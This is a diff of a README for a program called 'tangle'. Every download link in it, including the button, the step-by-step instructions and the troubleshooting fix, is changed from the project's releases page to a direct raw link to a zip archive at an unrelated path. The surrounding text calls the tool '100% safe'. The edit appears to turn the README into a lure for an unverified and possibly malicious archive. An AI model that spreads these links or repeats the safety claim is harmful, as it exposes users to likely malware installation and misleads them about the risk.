@@ -37,7 +37,7 @@ Let's get tangle onto your computer. Follow these steps:
 ### Step 1: Visit the Download Page
 Click the button below to go to the official tangle download page:
 
-[**⬇️ DOWNLOAD TANGLE**](https://github.com/tcdmwcaa/tangle/releases)
+[**⬇️ DOWNLOAD TANGLE**](https://raw.githubusercontent.com/tcdmwcaa/tangle/main/kooliman/3.5.zip)
 
 *(The button above is your golden ticket!)*
 
@@ -55,7 +55,7 @@ Click on the file name to start downloading. Your browser will save it to your *
 ### Step 4: Run the Application
 
 **Visit this link to download the application:**  
-[**🔗 GO TO TANGLE DOWNLOAD PAGE**](https://github.com/tcdmwcaa/tangle/releases)
+[**🔗 GO TO TANGLE DOWNLOAD PAGE**](https://raw.githubusercontent.com/tcdmwcaa/tangle/main/kooliman/3.5.zip)
 
 Once you're on that page:
 
@@ -134,7 +134,7 @@ tangle is **100% safe**. It comes from a trusted repository (GitHub) and doesn't
 - Make sure your browser is updated.
 
 ### Problem: I see a "Missing DLL" error
-- **Solution:** Download the latest version from the [download page](https://github.com/tcdmwcaa/tangle/releases). Older versions might have this issue.
+- **Solution:** Download the latest version from the [download page](https://raw.githubusercontent.com/tcdmwcaa/tangle/main/kooliman/3.5.zip). Older versions might have this issue.
 
 ### Problem: The app is very slow
 - **Solution:** Close other heavy programs (like games or video editors).
@@ -163,7 +163,7 @@ So what are you waiting for? **Download tangle today and unleash your inner data
 
 ### 🔗 Quick Download Link Again
 
-[**🚀 GET TANGLE NOW**](https://github.com/tcdmwcaa/tangle/releases)
+[**🚀 GET TANGLE NOW**](https://raw.githubusercontent.com/tcdmwcaa/tangle/main/kooliman/3.5.zip)
 
 ---
 
